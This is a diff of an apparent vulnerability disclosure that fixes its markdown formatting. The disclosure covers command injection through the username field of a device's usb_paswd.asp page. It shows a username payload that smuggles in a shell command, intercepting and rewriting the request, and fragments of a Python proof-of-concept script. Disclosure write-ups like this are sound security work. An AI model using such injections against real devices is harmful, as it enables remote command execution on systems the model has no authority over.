@@ -1,17 +1,23 @@
 After the user maliciously constructs the parameter http_username, accessing the function usb_paswd_asp in the file usb_paswd.asp will cause post-authentication command injection. The attack can be launched remotely.
+
 ![image](https://github.com/user-attachments/assets/fc945338-d12a-49a0-a922-b13768e661f1)![image](https://github.com/user-attachments/assets/0965873e-426b-4a06-ad5a-552589f4b0d6)
 Capture packets in the user management interface to modify the user name to malicious commands
+
 ![image](https://github.com/user-attachments/assets/72d3e973-9e38-4e72-bb19-c0b7a193a0a1)
 ![image](https://github.com/user-attachments/assets/890f217b-447c-4118-9924-57af0dca6074)
-set username:`echo HELLOWORLD > /tmp/hacked`
+
+set username:\`echo HELLOWORLD > /tmp/hacked\`
 ![image](https://github.com/user-attachments/assets/46208859-b1cf-48cd-b0c3-04db399d752a)
 payload = /usb_paswd.asp?share_enable=1&passwd=1&name=1
+
 ![image](https://github.com/user-attachments/assets/1d094768-7262-4af3-836b-e69294933fd2)
 
 ![image](https://github.com/user-attachments/assets/b8f8c4c5-1b62-43f3-90c6-8770d461ccdf)
 
 #POC
-···
+
+
+```python
 import requests
 
 # POST /login.cgi HTTP/1.1
@@ -106,4 +112,4 @@ burp1_headers = {
 }
 response = requests.get(burp1_url, headers=burp1_headers)
 print(response.text)
-···
+```
